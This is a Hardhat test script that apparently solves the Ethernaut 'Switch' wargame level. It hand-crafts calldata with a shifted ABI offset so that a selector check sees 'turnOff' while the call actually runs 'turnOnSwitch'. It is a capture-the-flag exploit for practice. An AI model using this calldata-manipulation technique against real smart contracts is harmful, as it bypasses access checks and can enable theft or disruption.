const { ethers } = require("hardhat")
const { assert } = require("chai")

/* 
    Enter the contract address below.
    Use `await contract.address in the console to get the address.
*/
const CONTRACT_ADDRESS = "0x8f45c40eBbc1C74Bd49B351c7fD4ba0e60D8d354"

describe("29 Switch", function () {
    let player, challengeContract

    before(async function () {
        ;[player] = await ethers.getSigners()
        challengeContract = await ethers.getContractAt(
            "Switch",
            CONTRACT_ADDRESS,
            player
        )
        const switchOnBefore = await challengeContract.switchOn()
        assert.equal(switchOnBefore, false)
    })

    it("Execution", async function () {
        const flipSwitchSelector = "0x30c13ade"
        const offset =
            "0000000000000000000000000000000000000000000000000000000000000060"
        const extraZeros =
            "0000000000000000000000000000000000000000000000000000000000000000"
        const turnOffSelector =
            "20606e1500000000000000000000000000000000000000000000000000000000"
        const lengthOfData =
            "0000000000000000000000000000000000000000000000000000000000000004"
        const turnOnSelector =
            "76227e1200000000000000000000000000000000000000000000000000000000"
        const data =
            flipSwitchSelector +
            offset +
            extraZeros +
            turnOffSelector +
            lengthOfData +
            turnOnSelector
        const txResponse = await player.sendTransaction({
            to: challengeContract.address,
            data: data,
        })
        await txResponse.wait(1)
    })

    after(async function () {
        const switchOnAfter = await challengeContract.switchOn()
        assert.equal(switchOnAfter, true)
    })
})
